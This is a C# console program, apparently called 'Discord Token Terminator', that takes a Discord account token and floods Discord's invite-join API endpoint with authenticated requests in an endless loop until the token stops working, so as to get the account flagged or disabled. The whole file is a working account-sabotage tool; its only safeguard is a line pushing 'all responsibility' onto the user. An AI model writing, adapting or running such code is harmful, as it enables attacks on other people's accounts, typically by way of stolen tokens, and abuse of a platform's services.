using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using Discord;
using Discord.Gateway;
using Leaf.xNet;

namespace TokenTerminator
{
	class Program
	{
        static void Main(string[] args)
		{
			start:
			Console.Clear();
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.Title = "Discord Token Terminator";
			Console.Write("Token you want to terminate: ");
            Console.ForegroundColor = ConsoleColor.White;
            string token = Console.ReadLine();
			DiscordClient client = new DiscordClient();
		    try
			{
				client.Token = token;
			}
			catch (Exception)

            {
                Console.ForegroundColor = ConsoleColor.Red;
				Console.WriteLine("Invalid Token");
				Console.ReadLine();
				goto start;
			}
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.WriteLine("NOTE: All responsibility is yours.");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("Are you sure you want to terminate the token? (Press any key to continue)");
			Console.ReadLine();
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.WriteLine("Process started please wait...");

			using (HttpRequest req = new HttpRequest())
			{
				while (true)
				{
					try
					{
						req.AddHeader("Authorization", token);
						req.Post("https://discordapp.com/api/v6/invite/minecraft");
						client.Token = token;
					}

					catch (Exception)
					{
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine("Token succesfully terminated");
						Console.ReadLine();
						Environment.Exit(0);
					}
				}
			}
		}
	}
}
